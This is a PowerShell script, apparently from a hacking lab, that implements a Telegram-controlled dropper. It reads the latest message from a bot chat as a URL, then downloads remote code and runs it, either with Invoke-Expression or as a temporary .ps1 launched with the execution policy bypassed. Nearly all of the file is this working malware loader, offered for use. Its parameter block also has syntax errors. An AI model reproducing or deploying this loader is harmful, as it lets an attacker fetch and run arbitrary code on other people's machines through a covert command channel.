function Log-Message
{
    [CmdletBinding()]
    Param
    (
        [Parameter(Mandatory=$true, Position=0)]
        [string]$LogMessage
    )

    Write-Output (" [DZHACKLAB] - ELMO9AWIM {0} - {1}" -f (Get-Date), $LogMessage)
}

Log-Message " [*] START JOB ------------------- ELMO9AWIM "

Function Get-File-PS-TELE-DROOPER{
  Param(
  [Parameter(Mandatory=$true,Position=0)] [String[]]$BId
  [Parameter(Mandatory=$true,Position=1)] [String[]]$BToken
  [Parameter(Mandatory=$False,Position=2)] [String[]]$Arguments,
  
  [Switch]
  $nodownload
 
  )
  
  
  
  
  Write-Output "BOT ID: $BId || BOT TOKEN: $BToken"


  $MyToken = $BToken
  $ChatID = $BId
  $MyBotUpdates = Invoke-WebRequest -Uri "https://api.telegram.org/bot$($MyToken)/getUpdates"
  #Convert the result from json and put them in an array
  $jsonresult = [array]($MyBotUpdates | ConvertFrom-Json).result

  $LastMessage = ""
  Foreach ($Result in $jsonresult)  {
    If ($Result.message.chat.id -eq $ChatID)  {
      $LastMessage = $Result.message.text
    }
  }

  Log-Message " [*] START DOWNLOADING ------------------- ELMO9AWIM "

  Write-Host "RUN ME $LastMessage"

  $TELEFILE = $LastMessage

  $ScriptURL = $TELEFILE

  if ($nodownload -eq $true)
    {
        Invoke-Expression ((New-Object Net.WebClient).DownloadString("$ScriptURL"))
        if($Arguments)
        {
            Invoke-Expression $Arguments
        }
    }
  else
    {
        $rand = Get-Random
        $webclient = New-Object System.Net.WebClient
        $file1 = "$env:temp\$rand.ps1"
        $webclient.DownloadFile($ScriptURL,"$file1")
        $script:pastevalue = powershell.exe -ExecutionPolicy Bypass -noLogo -command $file1
        Invoke-Expression $pastevalue
    }


  Log-Message " [*] END JOB ------------------- ELMO9AWIM "
  
  Write-Host "RUN ME $FRun HACKER ---------------- EXPLOIT ?.> "
  
  
}

# Get-File-PS-TELE-DROOPER -BId "TELEGRAM ID" -BToken "TELEGRAM TOKEN" -Arguments "HACKTEAM SERVER"


        
